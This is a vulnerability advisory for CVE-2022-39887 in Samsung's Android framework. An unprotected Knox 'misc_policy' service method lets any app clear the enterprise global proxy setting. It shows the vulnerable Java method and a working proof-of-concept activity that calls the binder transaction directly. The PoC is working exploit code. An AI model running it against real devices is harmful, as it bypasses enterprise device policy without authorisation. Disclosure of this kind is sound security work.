# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.07.30</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39887">CVE-2022-39887</a> (SVE-2022-1809)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$440</td>
    </tr>
</table>

# Description

The system service `misc_policy` (`com.samsung.android.knox.IMiscPolicy`) contained a method to reset the proxy from the Samsung EDM database, which was not protected in any way.

File `com/android/server/enterprise/general/MiscPolicy.java`:
```java
public synchronized void clearAllGlobalProxy() {
    ContentValues cv = new ContentValues();
    cv.put("globalProxy", false);
    EdmStorageProviderBase base = new EdmStorageProviderBase(this.mContext);
    base.update("RESTRICTION", cv, null);
}
```

**Proof of Concept**

```java
static final int TRANSACTION_clearAllGlobalProxy = 29;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("misc_policy");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_clearAllGlobalProxy, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
